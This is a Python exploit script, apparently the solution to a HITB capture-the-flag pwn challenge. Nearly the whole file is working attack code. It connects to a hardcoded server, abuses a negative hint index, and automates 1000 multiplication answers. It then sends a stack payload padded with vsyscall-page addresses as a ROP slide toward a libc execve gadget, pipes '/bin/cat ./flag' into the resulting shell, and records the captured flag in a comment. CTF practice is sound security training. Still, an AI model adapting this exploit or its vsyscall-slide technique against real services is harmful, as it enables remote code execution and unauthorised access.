import socket
import time
import struct

# FLAG: HITB{d989d44665a5a58565e09e7442606506}

CONN_ADDR = ('47.74.147.103' , 20001)
SLEEP_TIME = 0.2
FAST_SLEEP_TIME = 0.05
RECV_AMOUNT = 512

def one_of_list_in(lst, dat):
    return (True in [z in dat for z in lst])

def recv_until_either(s, tr_list):
    all_data = ''
    in_data = s.recv(RECV_AMOUNT)
    while not one_of_list_in(tr_list, in_data):
        all_data += in_data
        in_data = s.recv(RECV_AMOUNT)
    all_data += in_data
    return all_data
    
def recv_until(s, tr):
    all_data = ''
    in_data = s.recv(RECV_AMOUNT)
    while tr not in in_data:
        all_data += in_data
        in_data = s.recv(RECV_AMOUNT)
    all_data += in_data
    return all_data
    
def send_string(s, wstr):
    s.sendall(wstr)
    time.sleep(SLEEP_TIME)
    
def send_int(s, choice):
    s.sendall(str(choice))
    time.sleep(SLEEP_TIME)
    
def send_int_fast(s, choice):
    s.sendall(str(choice))
    time.sleep(FAST_SLEEP_TIME)
    
def main():
    GO_CHOICE = 1
    HINT_CHOICE = 2
    GIVE_UP_CHOICE = 3
    
    offset_running_execve = 0xF0274
    offset_system = 0x45390
    
    s = socket.socket()
    s.connect(CONN_ADDR)
    
    # 0x800 - sys_getcpu, 0x400 - sys_time, 0x0 - sys_gettimeofday
    rop_slide_pivot = struct.pack('<Q', 0xffffffffff600800) 
    
    print recv_until(s, 'Give up')
    send_int(s, HINT_CHOICE)
    print recv_until(s, 'NO PWN NO FUN')
    send_int(s, GO_CHOICE)
    send_int(s, 0)
    send_int(s, -294)
    data = recv_until(s, 'Answer')
    print data
    while 'Level 1000' not in data:
        rel_data = data.split('Question: ')[1].split('=')[0]
        first_num = int(rel_data.split('*')[0].strip())
        second_num = int(rel_data.split('*')[1].strip())
        print first_num * second_num
        send_int_fast(s, first_num * second_num)
        data = recv_until(s, 'Answer')
        print data
    # The /bin/ls here has no effect in the end
    send_int(s, '/bin/ls\x00' + rop_slide_pivot * ((0x28 / 8) + 4))
    send_string(s, '/bin/cat ./flag\n' * 20) # on executed shell
    print s.recv(4096)
    
main()
